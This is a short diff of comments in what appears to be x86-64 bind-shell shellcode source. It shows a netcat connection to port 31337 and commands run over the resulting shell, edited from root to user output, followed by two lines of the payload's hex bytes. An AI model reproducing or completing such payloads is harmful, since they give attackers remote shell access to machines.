@@ -7,9 +7,9 @@
 ;	$ nc -vvv 127.0.0.1 31337
 ;	Connection to 127.0.0.1 31337 port [tcp/*] succeeded!
 ;	whoami
-;	root
+;	user
 ;	pwd
-;	/root
+;	/home/user
 
 ;  6a 29 58 6a 02 5f 6a 01  5e 99 0f 05 48 89 c7 6a
 ;  31 58 48 31 d2 52 66 c7  44 24 02 7a 69 c6 04 24
